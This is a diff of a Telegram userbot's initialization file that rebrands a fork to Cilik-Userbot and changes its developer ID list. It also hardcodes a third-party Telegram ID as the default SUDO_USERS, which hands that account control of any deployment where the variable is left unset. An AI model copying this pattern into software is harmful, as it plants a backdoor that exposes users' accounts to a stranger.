@@ -6,7 +6,7 @@
 #
 # inline credit @keselekpermen69
 # From Man-Userbot @mrismanaziz
-# Recode by @Uncheline
+# Recode by @greyyvbss
 """ Userbot initialization. """
 
 import logging
@@ -101,21 +101,20 @@ if CONFIG_CHECK:
 
 DEVS = (
     1784606556, 
-    844432220,
-    1820233416,
+    2046879193,
+    844432220,  
+    1820233416, 
     1540632666, 
     1883126074, 
     1977874449, 
-    2077108390,
-    2028793128, 
-    2077828117,
-    2127265501,
     1416529201,
     2130526178,
+    1700405732,
     5160736615,
 )
+
   
-SUDO_USERS = {int(x) for x in os.environ.get("SUDO_USERS", "5160736615").split()}
+SUDO_USERS = {int(x) for x in os.environ.get("SUDO_USERS", "1784606556").split()}
 BL_CHAT = {int(x) for x in os.environ.get("BL_CHAT", "").split()}
 BLACKLIST_GCAST = {int(x) for x in os.environ.get("BLACKLIST_GCAST", "").split()}
 
@@ -155,8 +154,8 @@ SUDO_HANDLER = os.environ.get("SUDO_HANDLER", r"$")
 OWNER_ID = int(os.environ.get("OWNER_ID") or 0)
 
 # Support
-GROUP = os.environ.get("GROUP", "VirtualTheInvincibles")
-CHANNEL = os.environ.get("CHANNEL", "Kotsuniee")
+GROUP = os.environ.get("GROUP", "CilikSupport")
+CHANNEL = os.environ.get("CHANNEL", "CilikProject")
 
 # Heroku Credentials for updater.
 HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
@@ -217,7 +216,7 @@ YOUTUBE_API_KEY = os.environ.get("YOUTUBE_API_KEY", None)
 ALIVE_TEKS_CUSTOM = os.environ.get("ALIVE_TEKS_CUSTOM", None)
 
 # Default .alive name
-ALIVE_NAME = os.environ.get("ALIVE_NAME", "Renall-Userbot")
+ALIVE_NAME = os.environ.get("ALIVE_NAME", "Cilik-Userbot")
 
 # Custom Emoji Alive
 ALIVE_EMOJI = os.environ.get("ALIVE_EMOJI", "✪")
@@ -252,7 +251,7 @@ ALIVE_USERNAME = os.environ.get("ALIVE_USERNAME", None)
 
 # Default .alive logo
 ALIVE_LOGO = (
-    os.environ.get("ALIVE_LOGO") or "https://telegra.ph/file/6e3acf830de688c882246.jpg"
+    os.environ.get("ALIVE_LOGO") or "https://telegra.ph/file/ac134f6d295ad0c03af9b.jpg"
 )
 
 INLINE_PIC = (
@@ -352,7 +351,7 @@ except Exception as e:
     
 async def update_restart_msg(chat_id, msg_id):
     message = (
-        f"**Renall-Ubot v{BOT_VER} is back up and running!**\n\n"
+        f"**Cilik-Userbot v{BOT_VER} is back up and running!**\n\n"
         f"**Telethon:** {version.__version__}\n"
         f"**Python:** {python_version()}\n"
         f"**User:** {owner}"
@@ -708,8 +707,8 @@ with bot:
             )
         )
         async def on_plug_in_callback_query_handler(event):
-            if event.query.user_id == uid or event.query.user_id in SUDO_USERS:  # @Cilik-Userbot
-                # https://t.me/TelethonChat/115200
+            if event.query.user_id == uid or event.query.user_id in SUDO_USERS:  # @Kyy-Userbot
+                # https://t.me/TelethonChat/115200                               # @Fliks-Userbot
                 await event.edit(
                     file=ciliklogo,
                     link_preview=True,
@@ -721,8 +720,8 @@ with bot:
             )
         )
         async def gback_handler(event):
-            if event.query.user_id == uid or event.query.user_id in SUDO_USERS:  # @cilik-Userbot
-                # https://t.me/TelethonChat/115200
+            if event.query.user_id == uid or event.query.user_id in SUDO_USERS:  # @Kyy-Userbot
+                # https://t.me/TelethonChat/115200                               # @Fliks-Userbot    
                 text = (
                     f"**🕹️ Cilik-Userbot Inline Menu 🕹️**\n\n🧸 **Owner :** [{user.first_name}](tg://user?id={user.id})\n🔮 **Jumlah :** `{len(dugmeler)}` **Modules**")
                 await event.edit(
@@ -843,4 +842,4 @@ with bot:
         LOGS.info(
             "Help Mode Inline Bot Mu Tidak aktif. Tidak di aktifkan juga tidak apa-apa. "
             "Untuk Mengaktifkannya Buat bot di @BotFather Lalu Tambahkan var BOT_TOKEN dan BOT_USERNAME. "
-            "Pergi Ke @BotFather lalu settings bot » Pilih mode inline » Turn On. ")
+            "Pergi Ke @BotFather lalu settings bqot » Pilih mode inline » Turn On. ")
